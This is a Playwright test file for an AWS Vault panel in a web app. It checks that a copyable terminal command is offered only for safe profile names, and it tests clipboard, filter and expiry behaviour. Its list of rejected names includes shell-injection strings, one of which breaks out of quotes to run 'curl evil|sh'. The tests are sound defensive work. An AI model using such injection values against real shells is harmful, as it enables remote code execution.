import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test, expect } from "@playwright/test";
import { spawnSync } from "node:child_process";
import { terminalCommand } from "../src/lib/access-metadata";

// Names that are one plain argument in every shell get a command; nothing else does. Quoting a
// hostile name for POSIX is not enough, because the user may paste into fish or PowerShell.
const plain = ["normal", "dev-readonly", "team.sso_2", "org/role@account", "a+b=c,d:e"];
for (const profile of plain) {
  test(`a plain profile name ${JSON.stringify(profile)} is passed as one argument`, () => {
    const dir = mkdtempSync(join(tmpdir(), "argv-only-"));
    try {
      writeFileSync(join(dir, "aws-vault"), "#!/bin/sh\nprintf '%s\\0' \"$@\"\n", { mode: 0o700 });
      const command = terminalCommand(profile);
      expect(command).toBe(`aws-vault exec -- ${profile}`);
      const result = spawnSync("/bin/sh", ["-c", command!], { encoding: "utf8", env: { PATH: dir } });
      expect(result.status).toBe(0);
      expect(result.stderr).toBe("");
      expect(result.stdout.split("\0")).toEqual(["exec", "--", profile, ""]);
    } finally {
      rmSync(dir, { recursive: true });
    }
  });
}
test("names that any shell could read differently get no command", () => {
  for (const name of [
    "",
    "two words",
    "--help",
    "-",
    "quote's profile",
    "$(printf injected); `printf backtick` & | > < * ? [a] !",
    'double"quote\\path',
    "a\\' ; curl evil|sh ; echo \\'b", // breaks out of single quotes in fish
    "π/开发",
    " trailing ",
    "bad\nname",
    "bad\0name",
    "bad\u0085name",
    "dev\u202Eevil", // bidi override
    "dev\u200Bops", // zero-width space
  ])
    expect(terminalCommand(name), JSON.stringify(name)).toBeNull();
});
async function open(page: import("@playwright/test").Page, query = "") {
  await page.goto(`/${query}`);
  await page.getByRole("button", { name: "Secrets", exact: true }).click();
  await page.getByRole("tab", { name: "AWS Vault", exact: true }).click();
  await page.getByRole("button", { name: "Refresh sessions", exact: true }).click();
  await expect(page.getByRole("table")).toBeVisible();
}
test("search, status filter, selected details and connections remain honest", async ({ page }) => {
  await open(page);
  await expect(page.getByText("1 expired", { exact: false })).toBeVisible();
  await page
    .getByRole("radiogroup", { name: "Cache status" })
    .getByRole("radio", { name: /^No cache \(/ })
    .click();
  await expect(page.getByRole("rowheader")).toHaveCount(2);
  await page.getByRole("searchbox", { name: "Search profiles" }).fill("missing");
  await expect(page.getByText("No profiles match your search or status filter.")).toBeVisible();
  await page.getByRole("button", { name: "Clear filters" }).click();
  const profile = page.getByRole("button", { name: "demo-readonly", exact: true });
  await profile.focus();
  await page.keyboard.press("Enter");
  await expect(profile).toHaveAttribute("aria-expanded", "true");
  await expect(page.getByText("Outside the selected session store", { exact: true })).toBeVisible();
  await expect(page.getByText("SSO cache present · expiry unknown")).toBeVisible();
  await page.getByRole("button", { name: "team-sso", exact: true }).click();
  await expect(profile).toHaveAttribute("aria-expanded", "false");
  await page.getByText("About session status", { exact: true }).click();
  await expect(page.getByText(/Authentication not checked/)).toBeVisible();
  await expect(page.getByText(/does not identify or verify a connected store/)).toBeVisible();
  await page.getByRole("button", { name: "Refresh sessions", exact: true }).click();
  await expect(page.getByRole("button", { name: "team-sso", exact: true })).toHaveAttribute(
    "aria-expanded",
    "false",
  );
});
test("a profile with an unusual name offers no command to copy", async ({ page }) => {
  const name = "--name ' $(printf harmless)";
  await open(page, `?profile=${encodeURIComponent(name)}`);
  await page.getByRole("button", { name, exact: true }).click();
  await expect(page.getByText(/No terminal command is offered for this profile/)).toBeVisible();
  await expect(page.getByRole("button", { name: "Copy terminal command" })).toHaveCount(0);
});

test("copy is exact, never executed, and clipboard errors are recoverable", async ({ page }) => {
  const name = "dev-readonly.eu_1";
  await page.addInitScript(() =>
    Object.defineProperty(navigator, "clipboard", {
      configurable: true,
      value: {
        writeText: async (value: string) => {
          (window as unknown as { copied: string }).copied = value;
        },
      },
    }),
  );
  await open(page, `?profile=${encodeURIComponent(name)}`);
  await page.getByRole("button", { name, exact: true }).click();
  await page.getByRole("button", { name: "Copy terminal command" }).click();
  expect(await page.evaluate(() => (window as unknown as { copied: string }).copied)).toBe(
    terminalCommand(name),
  );
  await expect(page.getByText("Command copied.")).toBeVisible();
  await page.evaluate(() =>
    Object.defineProperty(navigator, "clipboard", {
      configurable: true,
      value: {
        writeText: async () => {
          throw new Error("denied");
        },
      },
    }),
  );
  await page.getByRole("button", { name: "Copy terminal command" }).click();
  await expect(page.getByRole("alert")).toContainText("Could not copy");
  await page.getByRole("button", { name: "Refresh sessions" }).click();
  await expect(page.getByRole("button", { name, exact: true })).toHaveAttribute("aria-expanded", "false");
  await expect(page.getByText("Command copied.")).toHaveCount(0);
});
test("expiry catches up after hidden view and filter follows current timestamps", async ({ page }) => {
  await open(page, "?access=ticking");
  await page
    .getByRole("radiogroup", { name: "Cache status" })
    .getByRole("radio", { name: /^Cached \(/ })
    .click();
  await page.getByRole("button", { name: "Scan", exact: true }).click();
  await page.waitForTimeout(3000);
  await page.getByRole("button", { name: "Secrets", exact: true }).click();
  await page.getByRole("tab", { name: "AWS Vault", exact: true }).click();
  await expect(page.getByText("No profiles match your search or status filter.")).toBeVisible();
  await page
    .getByRole("radiogroup", { name: "Cache status" })
    .getByRole("radio", { name: /^Expired \(/ })
    .click();
  await expect(page.getByRole("table").getByText("Expired", { exact: true })).toBeVisible();
});

test("only typed unavailable hides AWS inventory and exposes setup", async ({ page }) => {
  await page.goto("/?access=unavailable");
  await page.getByRole("button", { name: "Secrets", exact: true }).click();
  await page.getByRole("tab", { name: "AWS Vault", exact: true }).click();
  await page.getByRole("button", { name: "Refresh sessions" }).click();
  await expect(page.getByRole("region", { name: "AWS Vault provider" })).toHaveCount(0);
  await expect(page.getByText(/Other locations were not searched/)).toBeVisible();
  await expect(page.getByRole("button", { name: "Check connections" })).toBeVisible();
  await page.evaluate(() => history.replaceState({}, "", "?access=error"));
  await page.getByRole("button", { name: "Check connections" }).click();
  await expect(page.getByRole("alert")).toBeVisible();
  await expect(page.getByRole("region", { name: "AWS Vault provider" })).toBeVisible();
  await expect(page.getByText("Provider unavailable", { exact: true })).toHaveCount(0);
});
